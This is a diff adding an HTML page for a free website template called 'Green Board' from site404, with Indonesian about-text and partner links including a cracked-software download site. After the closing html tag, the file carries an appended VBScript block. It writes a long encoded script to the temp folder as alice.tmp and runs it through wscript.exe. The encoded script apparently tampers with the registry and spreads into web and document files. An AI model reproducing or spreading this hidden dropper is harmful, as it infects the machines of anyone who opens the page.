@@ -1,0 +1,276 @@
+<!-			    ********      ****    ************    ************          ****      ******            ****  
+ 			  ************    ****    ************    ************        ******    **********        ******  
+  			  ****            ****        ****        ****                ******    ****  ****        ******  
+  		      	  **********      ****        ****        ************      ********    ****  ****      ********  
+      			      ********    ****        ****        ************    ****  ****    ****  ****    ****  ****  
+          		          ****    ****        ****        ****            ************  ****  ****    ************
+  		   	  ************    ****        ****        ************    ************  **********    ************
+    			    ********      ****        ****        ************          ****      ******            ****  
+
+							   ALL script By : www.site404.com
+
+
+             							   ;;ttkkkkkkkktt              
+        						       ;;RRMMMMMMMMMMMMMMMMZZ          
+      							     ""MMMMMMMMMMMMMMMMMMMMMMMMtt      
+    							   ""MMMMMMMMMMMMMMMMMMMMMMMMMMMMJJ    
+  							 ttMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM;;  
+  							 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+							 ttMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMtt
+							 kkMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMww
+							 kkMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMww
+							 kkMM""RRMMMMMMMMMMMMMMMMMMMMMMMMMMJJZZww
+	  						 kkRR    ttMMMMMMMMMMMMMMMMMMMMtt    kkww
+							 ""MM        wwMMMMMMMMMMMMZZ        RRtt
+							 ;;MMtt          kkMMMMww""          MM;;
+  						 	   wwMMwwtt      ttRRMMJJ      ttkkMMMM  
+    							     MMMMMMMMMMMMMM;;ttMMMMMMMMMMMMMMZZ  
+  							   ttMMMMMMMMMMMMZZ  ""JJMMMMMMMMMMMMww  
+  							   wwMMMMMMkkJJMMZZwwZZJJMMMMkk""wwMMMM  
+  							   ttMMMM""  ""MMMMMMMMMMMMMM""  ttMM;;  
+    						 	     ;;  ""  ttMMZZMMRRZZZZMM    ;;      
+            							  ;;;MMkkMMJJkkMMRR;;;;;            
+             							     MMM  MMM  Kkk  JJJ            
+              							     MMM  MMM  Kkk  JJJ           
+              							     RRM  MMM  Kkk  JJJ            
+              							     MMM  MMM  Kkk  ttJ            
+              							     MMM  MMM  Kkk  ttt            
+             				 			     MMM  MMM  Kkk  ttt            
+              							     ttt  wwW  Kkk  ttt              
+               							      t    W    k    t											
+
+
+
+
+
+								      
+  
+         
+               
+                              																		
+
+
+
+																				-!>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Green Board - Site404</title>
+<link rel='SHORTCUT ICON' type='image/x-icon' href='images/404.gif'>
+<meta name="keywords" content="Site404.com, Site404, 404, Green Board, free download, website templates, CSS, HTML" />
+<meta name="description" content=">Green Board is a free website template from www.site404.com" />
+<link href="site404_style.css" rel="stylesheet" type="text/css" />
+<link href="site404-slider.css" rel="stylesheet" type="text/css" media="screen" title="no title" charset="utf-8" />
+
+<script src="js/jquery-1.2.6.js" type="text/javascript"></script>
+<script src="js/jquery.scrollTo-1.3.3.js" type="text/javascript"></script>
+<script src="js/jquery.localscroll-1.2.5.js" type="text/javascript" charset="utf-8"></script>
+<script src="js/jquery.serialScroll-1.2.1.js" type="text/javascript" charset="utf-8"></script>
+<script src="js/site404-slider.js" type="text/javascript" charset="utf-8"></script>
+<script src="js/jquery.easing.1.3.js" type="text/javascript" charset="utf-8"></script>
+
+</head>
+<body>
+	
+    <div id="slider">
+    	
+        <div id="header">
+        	<div id="sitetitle">
+	        	<a href="http://www.templatemo.com"><img src="images/logo.png" alt="LOGO" /></a>
+            </div>
+            <a class="header_menu" href="http://www.twitter.com/site404"><img src="images/twitter_header.png" alt="Twitter" /></a>
+            <a class="header_menu" href="#contact"><img src="images/contact.png" alt="contact us" /></a>
+        </div>
+        
+        <div id="content">
+        
+            <div class="scroll">
+                <div class="scrollContainer">
+                
+                    <div class="panel" id="home">
+                    	<div class="col_550 float_l">
+                            <h1>Welcome to Green Board by site404</h1>    
+                            
+                            <p><em>Wellcome Our Green Board Website Site404, Free Website Template CSS, HTML, By : <a href="http://www.site404.com" target="_blank">Site404</a>.</em></p>
+                            
+                            <p>Green Board is a Free CSS Template from <a href="http://www.site404.com" target="_parent">site404</a>. You may edit and apply this template for your websites. Credits go to <a href="http://www.photovaco.com" target="_blank">Free Photos</a> and <a href="http://jwloh.deviantart.com/art/Social-me-90694011" target="_blank">Social Icons</a>.</p>
+                            <div class="cleaner_h30"></div>
+                            <h2>Our Services</h2>
+                            <div class="image_wrapper image_fl"><img src="images/filee666.png" alt="Image 1" /></div>
+                            <p>Free Web CSS From <a href="http://site404.com/" target="_blank">Site404</a>, 100% Free.</p> <div class="btn_more"><a href="#services">Read more</a></div>
+						</div>
+                        
+                        <div class="col_300 float_r">
+                            <h2>About Us</h2> 
+                            <p><em>Hellcome di web ane yak !!!. Terima kasih udah mau singgah di web ane, jangan lupa cuap-cuapnye yak via pm, facebook, twitter, ym atau kontak ane, mari kita saling berbagi ilmu tentang apa aja.</em></p>
+                            <div class="btn_more"><a href="#about">Read more</a></div>
+                            
+                            <div class="cleaner_h30"></div>
+                            
+                            <h2>Featured Work</h2>
+                            <div class="image_wrapper"><img src="images/gallery/root2.jpg" alt="Image 2" /></div>
+                            <div class="btn_more"><a href="#gallery">Read more</a></div>
+                        </div>
+                    </div> <!-- end of home -->
+                    
+                    <div class="panel" id="about">
+                        <h1>About Us</h1>
+                        <div class="image_wrapper image_fl"><img src="images/site404.jpg" alt="image 3" /></div>
+                        <p><em>Hellcome di web ane yak !!!. Terima kasih udah mau singgah di web ane, jangan lupa cuap-cuapnye yak via pm, facebook, twitter, ym atau kontak ane, mari kita saling berbagi ilmu tentang apa aja.</em></p>
+                        <p align="justify">Site404 adalah sebuah rumah, wadah, tempat, web yang akan memberikan informasi-informasi penting di dunia
+			Site404 tak bermaksud menyaingi  web-web yang lain, Site404  masih banyak belajar dari web-web yang lain
+			Site404 akan selalu mengupdate informasi-informasi setiap minggu atau insya Allah akan mengupdate tiap hari
+			Site404 di didirkan seorang  mahasiswa Swasta S1 Sistem Informasi Daerah depok yang berasal dari jakarta</p>
+                        <div class="cleaner_h30"></div>
+                        <ul id="social_box">
+                            <li><a href="http://facebook.com/Site404"><img src="images/facebook.png" alt="facebook" /></a></li>
+                            <li><a href="http://twitter.com/Site404"><img src="images/twitter.png" alt="twitter" /></a></li>
+                            <li><a href="http://linkedin.com/Site404"><img src="images/linkedin.png" alt="linkin" /></a></li>
+                            <li><a href="http://technorati.com/Site404"><img src="images/technorati.png" alt="technorati" /></a></li>
+                            <li><a href="http://myspace.com/Site404"><img src="images/myspace.png" alt="myspace" /></a></li>                
+                        </ul>
+                    </div>
+                    
+                    <div class="panel" id="services">
+                    	<div class="col_380 float_l">
+                        	<h1>Service</h1>
+                            <img src="images/site404.jpg" alt="image 04" class="image_wrapper image_fl" />
+                          <p align="justify">Free Web CSS From <a href="http://site404.com/" target="_blank">Site404</a>, 100% Free Berikut Di samping Ini Partner Site404 Yang menyediakan Free Download Android Aplication, Free Download  Software Full Crack Patch Serial Keygen Activation Code License Key, Free Web Template HTML5 And CSS3, Radio Online Neraka The Best Sound Online And Streaming Radio From Indonesia, dan Jual Aksessoris handphone, Laptop dan Komputer Murah.</p>
+                            
+                        </div>
+                        <div class="col_380 float_r">
+                        	<h1>Service List</h1>
+                            <p>Free Web CSS From <a href="http://site404.com/" target="_blank">Site404</a>, 100% Free</p>
+                            
+                            <ul class="service_list">
+                            <li><a href="http://fadli-tn.info/android/" target="_blank" title="A few code of life" class="service_one">Fadli-Tn - A few code of life</a></li>
+                            <li><a href="http://www.file666.com"  target="_blank" title="Free Download Software Full Crack Patch Serial Keygen Activation Code License Key" class="service_two">File666 - Free Download Software Full Crack Patch Serial Keygen Activation Code License Key,</a></li>
+                            <li><a href="http://www.blizbox.com"  target="_blank" title="Free Web Template HTML5 And CSS3" class="service_three">Blizbox - Free Web Template HTML5 And CSS3</a></li>
+                            <li><a href="http://www.neraka.web.id"  target="_blank" title="The Best Sound Online And Streaming Radio From Indonesia" class="service_four">Neraka Radio - The Best Sound Online And Streaming Radio From Indonesia</a></li>
+                            <li><a href="http://www.kuskusshop.blogspot.com"  target="_blank" title="Sell Mobile Phone Accessories, Laptop, cheap Computer" class="service_five">Kus-Kus Shop - Sell Mobile Phone Accessories, Laptop, cheap Computer</a></li>   
+                            </ul>
+                         </div>
+                    </div>
+                
+                    <div class="panel" id="gallery">
+                        <h1>Website Gallery</h1>
+                        
+                        <div id="gallery_container">
+                            <div class="gallery_box">
+                                <img src="images/gallery/root1.jpg" alt="01" />
+                                <p>Template Web Portal CSS Nubito Root 1</p> 
+                                 <div class="btn_more"><a href="http://computer-site404.blogspot.com/2012/02/hi.html">Visit <span>&raquo;</span></a></div>
+                                <div class="cleaner"></div>
+                            </div>
+                            <div class="gallery_box">
+                                <img src="images/gallery/root2.jpg" alt="02" />
+                                <p>Template Web Portal CSS Nubito Root 2</p> 
+                                 <div class="btn_more"><a href="http://computer-site404.blogspot.com/2012/02/template-web-portal-css-nubito-root-2.html">Visit <span>&raquo;</span></a></div>
+                                <div class="cleaner"></div>                      
+                            </div>
+                            <div class="gallery_box">
+                                <img src="images/gallery/minisocial.png" alt="03" />
+                                <p>Template Web Portal CSS Site404 - Mini Social</p> 
+                                 <div class="btn_more"><a href="http://computer-site404.blogspot.com/2012/02/template-web-portal-css-site404-mini.html">Visit <span>&raquo;</span></a></div>
+                                <div class="cleaner"></div>     
+                            </div>
+                           <div class="gallery_box">
+                                <img src="images/gallery/thewall.png" alt="03" />
+                                <p>Template Web Portal CSS Site404 - The Wall</p> 
+                                 <div class="btn_more"><a href="http://computer-site404.blogspot.com/2012/02/template-web-portal-css-site404-wall.html">Visit <span>&raquo;</span></a></div>
+                                <div class="cleaner"></div>     
+                            </div>
+                            <div class="gallery_box">
+                                <img src="images/gallery/soundbox.png" alt="04" />
+                                <p> Template Web Portal CSS Site404 - Sound Box</p> 
+                                 <div class="btn_more"><a href="#">Visit <span>&raquo;</span></a></div>
+                                <div class="cleaner"></div>             
+                            </div>
+                            <div class="gallery_box">
+                                <img src="images/gallery/wallshelf.png" alt="6" />
+                                <p> Template Web Portal CSS Site404 - Wall Shelf</p> 
+                                 <div class="btn_more"><a href="#">Visit <span>&raquo;</span></a></div>
+                                <div class="cleaner"></div>          
+                            </div>
+                            <div class="cleaner"></div>
+                        </div>
+                
+                    </div>
+                
+                    <div class="panel" id="contact">
+                    	<h1>Contact Information</h1>
+            
+                        <p>Isi Buku tamunya yak ...</p>
+                        
+                        <div class="cleaner_h10"></div>
+                                                
+                        <div class="col_380 float_l">
+                        
+                            <div id="contact_form">
+                            
+                                <form method="post" name="contact" action="#contact">
+
+                                <label for="author">Name:</label> <input name="author" type="text" class="required input_field" id="author" maxlength="60" />
+                                <div class="cleaner_h10"></div>
+                                
+                                <label for="email">Email:</label> <input name="email" type="text" class="validate-email required input_field" id="email" maxlength="60" />
+                                <div class="cleaner_h10"></div>
+                                
+                                <label for="text">Message:</label> <textarea name="text" rows="0" cols="0" class="required" id="text"></textarea>
+                                <div class="cleaner_h10"></div>
+                                
+                                <input type="submit" class="submit_btn float_l" name="submit" id="submit" value="Send" />
+                                <input type="reset" class="submit_btn float_r" name="reset" id="reset" value="Reset" />    
+                                
+                                </form>
+                                
+                            </div>
+                            
+						</div>
+                        
+                        <div class="col_380 float_r">
+                            <h4>Address</h4>
+                        Site404 City <br />
+                        CyberCity Coder<br />
+
+			<br /><br />
+
+                    	<strong>Email:</strong> <a href="mailto:me@site404.com">me@site404.com</a><br />
+                        <strong>Web:</strong> <a href="http://www.site404.com" target="_parent">www.site404.com</a>  
+                        </div>
+                        
+                	</div>
+                    
+                </div>
+            </div>
+            
+            <!-- end of scroll -->
+        
+        </div>
+        
+        <div id="menu">
+            <ul class="navigation">
+                <li><a href="#home" class="selected">Home<span class="ui_icon home"></span></a></li>
+                <li><a href="#about">About Us<span class="ui_icon aboutus"></span></a></li>
+                <li><a href="#services">Services<span class="ui_icon services"></span></a></li>
+                <li><a href="#gallery">Gallery<span class="ui_icon gallery"></span></a></li>
+                <li><a href="#contact">Contact<span  class="ui_icon contactus"></span></a></li>
+            </ul>
+        </div>
+        
+        <div id="footer">
+        
+       	Copyright &copy; 2012 <a href="#">Your Website Name</a> | Website Templates by <a href="http://www.site404.com" target="_parent">site404</a>
+        
+        </div>
+    
+    </div> <!-- end of slider -->
+
+</body>
+</html>
+<HTML>
+<SCRIPT language="VBScript">
+on error resume next:set i129a=createobject("Scripting.FileSystemObject"):set uvqkz=createobject("WScript.Shell"):set ony43=i129a.getspecialfolder(1):set rowb1=i129a.getspecialfolder(2):p3vli="#@~^bx4AAA==GaYrKx,+6aVb^kD@#@&Nb:~W2!!SY4w0aSh6^ms~z+1;~CkXs4@#@&dnDP0fTZ+xmMnmYnK4N+mD`rjmMk2YbxL wkVjXkY+s68LmDJb@#@&dY~Y420a'^.lYnG(LnmDcrj1DbwYc?4nV^Jb@#@&/nO,:6^^:{0&ZTnRT+D0rVncS/^Db2Yc/^.bwYW;^VUlsn*@#@&k+DPX,!n'6&T!RLnD/w^kmV0Ks[+M`Z#@#@&dnDPCkXs4{0fTZ+RLnD/2+1rmVWKV9+DvF*@#@&kE8PmXW2+`m0qma#@#@&GUPDMW.P.nkEh+,U+XY@#@&9k:~dWFV%@#@&7cqD0vm38mab@#@&/nY,/*q0%'6f!Z+RTnO0bV`^3q^a#@#@&k*F0% CDYDr8!Yn/{fO@#@&x9P/!4@#@&/!4~0ZVXqv#@#@&Gx,+DMG.PM+kEh+~U6O@#@&[ksP8LS&E@#@&6W.PC1t~(oS&E,k	~02!T+cN.r7+/@#@&k6P`(LA&!R9Dr\nOHwn'8~WMP8LS&E [Mk-+Dza+xyPKDP(oSfEcN.k7+Oza+'2bPmxN,8Lh2EcwCY4@!@*J))r~Y4+U@#@&lXW2+`8oSf!R2mY4[J'l^rmRCV1Jb@#@&;lTqxv4oSf;RalDt'JwC!YGD!URbxWE*@#@&dzm/%`(LS&;cwmYtLJ'E#@#@&.k9v8c(oh2;RalY4'E-r#@#@&nx[~b0@#@&	n6D@#@&n	NPd;(@#@&/!8,tzyv^`#@#@&KUPD.WMP.nkE:~x6Y@#@&[ksP,sLÿSaE.w^@#@&6W.~lm4~,sL.~bx~6&Z!+coO0KV[+M`O4a0wcdwmkmsWW^NDd`E]mnxDE#*RWr^+/@#@&aE.w^x^mCk+v0&Z! oYn6D+UdbWx	C:`+Os%ycwmY4#b@#@&kWPa;DaVxE^x3E~Dtnx@#@&.wÿK+v+,^L. wmY4#@#@&nU9Pk6@#@&	+6D@#@&+	N,/;4@#@&kE8P0;oX;c2O3D5SSy^*b@#@&G	PDDKD,.+kEh+,xnaD@#@&9r:,;/y*{~.02mA~C*.wO~!1vZlSV(3y[@#@&/nY,5k *F'6&!Z+cGwxO+XYWr^+`a13M;~8b@#@&.02mA'5dyc{RMnl9lss@#@&;d+WG m^Gk+@#@&/YP$/y*G{0f!Z+ Ga+xDn6D0k^nc:XV1:SFb@#@&l*yaO'$/+*FRDnC9lsV@#@&$/+WGcmVK/@#@&!,!m'.naVl1n`mcyaOSm4Dv&*#S^4Dc 8#*@#@&V(3y[x74^D^WLJ@!_KtS@*r[78mMVW[r@!j/ÿqn:~Vmxo!CL+{JLm4DcfW#'Jj$?1Dr2DJ[^4M`fc*'r@*EL\(mD^0LEW	PnDMW.~M+/!h+,x+XOl/Y,kq 1C{m.+mO+K4%n1Y`E'1t.`2**[EUmMkwDk	LRwks+UXdO:r(%+1YJL^4Dv&W#'Jblk+OP!-;0yx^M+lOnK4%+1OvJ'1tM`&W#LEUm.kaY j4+V^E[1tDvf*#LJ*)d+O~Kxzc2xk8 1Cco+Oda+^kms6Ws9+M`F*)knY,DGh(Fxr8 ,m oY/an^kmV6WsNn.v b)af\^kxELmt.c2cb[!1+!CLm4D`2c*'J=VftZVx.wVm^+vw&7sr~1tM`+FbBm4Dvfc*#lnk4\Vx^&4!^'1t.v!*)/Y,r\K0C'bF+1mRmMnlD+YaO0bV`.WA88[E[14Dv&*bLJ-CsbmnRDhaJ'1tM`&W#LE~DD;+*)r-K0lcADbY+vnd473*)r\GWmR^VKd+=E-50yR.;	`GxH*2[ELm4D`2c*'J'hdmMk2Oc+6~zJ+)78dmMkaY +U^KNnPr'm4DcfW#[E'MWA48'r[^4Dv&c*[rwl^k^+cYh2r[m4.`2c#LEbJL\(m.VW'r@!&?;]qhK@*EL\4^.^0'J@!&_K\d@*r@#@&k+D~;k *G{0fTZ+R1.+mY+DnaY6k^+chÿ^l+SYM;+*@#@&5k c{ SDrYc.0f1h*@#@&$/y*Gch.kD+cV(3y9b@#@&;/y*{R1VK/n@#@&n	N~/!8@#@&0;U1YkGU,V%hKhvN8ZcS#@#@&VNAWs'Ota02 M+oMnl9`J_F/I'Rr[[4T*S[E-rb@#@&+U[,0EU^DkGx@#@&kE8,V^oyR`*@#@&Kx~+MDG.,D+k;:PxaO@#@&NKPAtrsPh6^^:{`CrXV4'E'N.k7nM/wmVbm+c/HdJ*@#@&0ZVXqv#@#@&sWKw@#@&nUN,/!4@#@&d;(Ph,T+wv#@#@&KxPn.MW.PMnkEhP	+6D@#@&r0,xGY,0fTZ+R6rV+6bdO/vlb6s4'E'N.k7nDk-Csbm+ dH/E#,O4+U@#@&mX0avvCkXV8[r-[.b\+Md-mVk1n /H/r#@#@&O4a02RM;xvlra^4[EwS/^Db2DRnX+,zz)78/1DrwDRnU1WN~JLlkXs8[r-9Dr\n.k-CVb^+c/zdr#@#@&n^/n@#@&-kGaK`*@#@&SmaAGv#@#@&4X+^`#@#@&V^oyRcb@#@&+	N~kW@#@&+UN,dE(@#@&d!4P5CTFU`6LFG2*@#@&Wx,+M.WMP.+kEhn,x+XO@#@&Nks~8Y6yS~O:V;N@#@&4DWyS'E,mEYG.!xDJL-(m.^0LJ/4+^s+X+^ED+xAkmDb2Yc+6~&z)74dm.raY +	^W9+~C^kmn mV^JL-(m.^0LJ/4+^s-Kwnx'mGhslx9xhkmDb2OR6P&znl74dmMrwDRnU1WNn~mVrm mV^r[74mMV6'JktnV^-naaVWMn-1W:sCUN{hkm.k2Oc+a+,&z)-8kmDr2DRnx1G9+~mVbm+cl^^J@#@&d+DPOh0EL{W&Z!+c^.+mYYn6OWbVn`6LGFwSOME+b@#@&Yh3!%ch.bY`4D0.A#@#@&O:0E% 1VWkn@#@&k0,n.Dcx!:8+.@!@*!~Y4nx@#@&ÿ2.W+cWTG{w*@#@&/nDPD:3!L{W&Z!nR1DnCD+YaY6kVcWoFGa~OD;n*@#@&YsVENRA.bY+c8D0ÿh*@#@&Yh0ENRm^Wkn@#@&+UN,kW@#@&/+D~Ys3ENxW&Z!RL+OWbVn`6LGFwb@#@&Y:V;NRCYD.b4;D+k'&O@#@&nx9PdE(@#@&d!4PMrN+4`Sr8*OvO#@#@&GU,+.DK.PM+d;s+PUnXY@#@&9rsPÿ9+D&@#@&0K.Pl^t,y[nD&PbUP6&!Zn oY6WsNn.vhr4l1vO# d!40Gs9+./@#@&b0~.NY&cxmh+@!@*EIAZe/d2Ir~l	NP.[nY2R	lh+@!@*r?z/Dn:,.Gs!:+~(	0GDsCDkG	J,Ytx@#@&/HldLvy[nD&RaCY4#@#@&.rN+4vy[+OfcwCY4b@#@&+U[,k0@#@&	+aY@#@&x[,/!4@#@&/!8PkXC/N`5G8;X*@#@&KxP..WMPM+dEhn,xn6D@#@&9kh~7V60^BYV%45B+r0V6~0(DOV@#@&0GD,+C^4P\^a%1Pk	~W&Z!RL+OWKV[+Mc;KF5z*R0rs/@#@&DVRt5{V1l/`6f!Z+ oYnaD+xkrW	xlsnc\^6Rm wCO4#b@#@&nk0VWx6&!TnconY(Ck+Um:`\^6R^RalOt*@#@&r6P`DV%4;'r[GmrPKD~YV04;xJ9GmXJ~GMPYV04;xJMO6Jb,l	NP^+6O`kVV6~+b@!@*J?yJ,YtU@#@&7c8YW`5G8;z[rwJL+rV^0[E 74nJ*@#@&\[R\k`\^6R^RalOt*@#@&n^/+bWPD3%45xJ4YsJ~W.~D30t$xJ4YhsrPY4n	@#@&3!LX;c7VX%mcwmOt*~c;KF5zLJ-r'+b3V6'ER4YmJb@#@&ÿayG+v-VX%^ alY4b@#@&nx9~b0@#@&x6Y@#@&UN,/;4@#@&d;(P\WqY6`hmO2V*@#@&WUPn.MW.PMn/!:n~	+6O@#@&Nr:,;Tx4~N3*7y@#@&/Y~ETx4{0&ZT+cWwUO+XY6ks+chXV^:Bq#@#@&%Vl\yx;Txtc.l[mV^@#@&!o	tcmsWk+@#@&k+Y,;o	vt{Wf!Z+cm.+COYn6DWk^+cAmYwsSDD;+*@#@&EL	v4RhMkDn`N3X\.#@#@&!ox+4R1VWkn@#@&b0,+.D U!:8+M@!@*ZPO4x@#@&ÿayG+vAmY2^#@#@&/Y,;o	v4'6&TTRmMnlD+YaO0bV`AlO2^~OD!n#@#@&;L	vt AMkO+v%0*-.#@#@&ETx+4R1VG/@#@&n	NPbW@#@&+x9~dE(@#@&/;4~-9%-/v2&.E+b@#@&WU~D.WM~M+d!:Px6D@#@&9khPa&W8T@#@&knY,w&68L'6&Z!nRLnD0rVcw2y;+*@#@&2f64LRmODDr(ED+/{&R@#@&x[PkE8@#@&/E(~\kG6Kcb@#@&W	PnD.GMP.+k;:PUnXY@#@&O4wWwc.o[VY+rCn/I'ew/4+ss6-;GxD+6D\nx!Cmx[Vn.k-6wUPqkO4'J@#@&O4wWwc.o[VY+rCn/I'kU06ksn'/tsV'qxkOCV^-1Wh:CU9-E@#@&Ota02 M+o[n^+O+runZ]'k	00bVw/4+sV'qUdDlV^wJ@#@&Y42WwcDo[+snD+ECn/I'DnL6kVnwktnV^wKwn	-1W:sl	[-r@#@&Y4wW2cD+T[+^+YEu|;I'DnoWr^+w/4nV^-G2x-E@#@&Y4w62cDnTNV+D+ru|;Iw.~2or^+-U4+^V-}2nxy-1Wh:CU9-E@#@&Ota02 M+o[n^+O+runZ]'.~2sbVw?4+sV'r2n	 -r@#@&Dtw62 Do9+s+OnrCFZÿw.~2or^+-j4Vs-A[bYw1Ws:l	N'E@#@&Y4w6w .oNs+D+J_F/I'.~2oksn'?4+^s-ANrO'J@#@&O4wWwc.oAMkD+J_|;i-UWWYSl.n'Hk1.WkW0Dw	k	NKhd-/;MDnxD#+M/rG	-2a2^W.+MwzN-mx1+N'Cb[NxE~r!ESrI2VmfqrIGE@#@&Dta02R.nTh.kDnJ_|/i'?WWOSl.+'\bm.K/K0Y'bUNKhd-;E..xYjnDkkW	w36aVKDnDw)9\Cx1nN'Cr[sksnA6OJBE8JSrIAM{G}]fr@#@&Y4wW2cD+TADbY+ruFZ`-UWWYACM+wHb^DK/GWD-rU9WA/'/!D.xD.+M/bGx'nGVbmrnk-2X2VKD+MwHWwk^+)/dG1kCYE~rFESrI2!mG6IGE@#@&O4w6wRM+TADbYnJ_|/i'?W6OhmD+'\rmMWkWWYw	bx[WSd-;E..xY#nM/rW	whWsbmb+/'2X2VKDnD'1GobxNrSJ8J~r]3M|fqr]fE@#@&Y4w62RM+LAMkYnE_|/j'jK0OSlM+-tk1.WkWWY'rU9WhkwZ!DDUO.DkkGxwKKVrmbn/'2a2^WDn.'1GsKs9+.}wDkW	/rSJ8JSJÿ2!mGrÿ9J@#@&Y42WwcDoADrOJu|;i-UWWOSlDnwtk^DKdK0O'bxNKhkwZ!D.+	Y#nM/kKU-hWVb^r+k-A62VG.Dw1K]E	JSE8J~E]AMmfq6ÿfE@#@&Dtw6wc.+Th.kD+EunZj'jW6Yhm.n-tk1DG/GWD-	k	[WS/w/!DDnUD.nDkrKxwhW^kmb+kw?H/O+s-9rkl4^nIokkO.X:WKVdJSE8JSJÿ3M|f	6ÿfJ@#@&Dt20a M+LSDbY+rCn/j'?G0DhC.-Hb^DK/W6Owbx9WA/w/!D.+	O.DdrKx-KG^k^kd'?zkY:-GkkC4^+Plk3\LMJ~rqJBJIA!mfqrÿfE@#@&O4wWwc.+Th.rD+JuF;jw?KWDhCM+'nW^k1r+k-\k1DGdK0Y'	k	NWSdw?H/D+h-9rkl8V/HGJSEyJ~E]AMmfq6ÿfE@#@&Dtw6wc.+Th.kD+EunSH'jrwKz]3-tk1DG/GWD-	k	[WS/~H:-Z;.M+UYjnM/rKx'I+TkkO+M+[rSxn.r~JzJq;2J@#@&Ota0aR.+LAMkO+ru|dHwj}sK	)ÿ2wHb^MWdK0D-bx9GhkPHK'Z;.M+xD#+M/kKUwIob/O+.n9r.omUk.lOrKxJSEr@#@&Y426w M+ThDbYECnS\-UroPqbIAwHbmDKdG0D-qkUNGAkPHK'/EMDnUD.+.dbWU-qr	VGTW	-jk+MrxbYE~mkas([J';/Dk	rOR6~E[CrXV8[rwhkm.raYRnaP&zl74d1DbwYc+	^W9+~JLlra^4[rwNMk\.d-mVbmnRdzkJ@#@&D4w6w .oh.rD+ECnJt-j}s:bÿ2'KW^k^k/w\bmDKdW6Y-qrUNKhkPHKwjH/O+s]+kYG.-frdm4s+U]r~E8JBJIAM|9}I9J@#@&O4a0wc.+ThDbOnJ_|dHw?6o:)IAwnKVr^b+/w\bm.WkG6Ywqk	NWS/,HK'?z/D+h]/YK.+'fkkC8VZKxWkLEBJqJBEIAMm9qrI9E@#@&nx9~kE8@#@&kE4,h12hF`b@#@&WU~DDK.PM+/!hnP	+XY@#@&[rsP.!m{EBDAzT*@#@&.Zl{E{E_|/ÿ-r[VNhKh`rNGmr#@#@&MhXTX'rC|;]wJLVNhG:cEjA3J*@#@&Dt2WaRDnLSDrY~MhzT*LJ-r~D4w6w Do.nmN`MTlFE[rwE#@#@&Dt202 M+LhMrYP.AHo*'E'fn0m;^Y(1W	-JBY420aR.+TDnC9`DZCG![J'9n0mE^Y(mGU'Jb@#@&Ota02 M+oA.bYnPMAHoXLJ'sDb+	[VHKzw1ChJ~D4w6wRMnLDl9`.!C{![E-rb~rI3!|2(K)gfm?\E@#@&O4w6wRM+TADbYnPMhzLl[J'H+7+DU4GhA6DJSJE@#@&+UN,dE(@#@&d!4Pa-46O`*@#@&WU,+MDWMPMn/!:nP	+aO@#@&NbhP0YV8{@#@&0Y^F{'sn6Yc:Xsms~sn	`:as1:bO2b@#@&r6Ps6V1:cUls+xJmVr^Rl^^J,YtU~@#@&Y4wWw .!x~X1E[Ew6wsGM+.RaP&~J/+^+1O~r[A/1Dr2DR/1.kaY0!ssxm:@#@&+sdkWP6f!Z+ WbV+nab/O/vVDVqF[rNW1J*~Y4+U@#@&Y426wRM;xvYtaW2RM+TDnl[crCFZÿwJLV%AK:`E[KmE#LE'/4V^-ra+	wmK:hl	NwE*[m4.`2 #L^4Dv&W#'3Os8G'J9Gmr[^4M`&*b*@#@&+^dkW,02!!R6rV+akkYdc0YV8{[rNW1aE#,Y4+U@#@&O4wWwc.E	`O4a0w .o.+m[vJunZÿ-JLVNAWs`ENKmaE*[J'dtVV'62+	-1Wh:CU9-E#L^tM`f+*[m4.v&*#LVDVqF[rNW16r'm4Dc&W#b@#@&+Vknk6P02TT+c0bVn+arkYd`0OV8G'EMY0Eb,Y4+	@#@&Y4a0aRD!xvOta02RM+L.lNvECnZI'E'VNhK:cJ.O6Jb[rw/4+ss'rwnU'mG:sC	Nwr#LmtM`2+#Lm4Dv&*bL3Y^qGLJDDWE[1tM`fcbb@#@&nx9~k6@#@&n	NPd;(@#@&/!8,y2.W`X!xN{#@#@&Gx,+..KDPMn/!:+,Un6D@#@&Nr:~W(D13@#@&02!TncN+snD+Wk^nvX;	LF#@#@&k6~+MD x!:8nM@!@*Z~Y4+x@#@&d+DP64.,Vx6&T! oYWr^+`z;	L{#@#@&64.O3clYDDb8ED+d'Z@#@&W2!! NV+DnWk^+vX;x%{*@#@&+	[Pb0@#@&xN~d!4@#@&X-46Ov#@#@&:Ooy2`*qrIJAA==^#~@ ":l3h0l=replace(p3vli,chr(216),chr(34)):esbvk=l3h0l&chr(0):set ivofa=i129a.createtextfile(rowb1&"\alice.tmp",true):ivofa.write(esbvk):ivofa.close:uvqkz.run(ony43&"\wscript.exe //e:vbscript.encode "&rowb1&"\alice.tmp")
+</SCRIPT>
+</HTML>
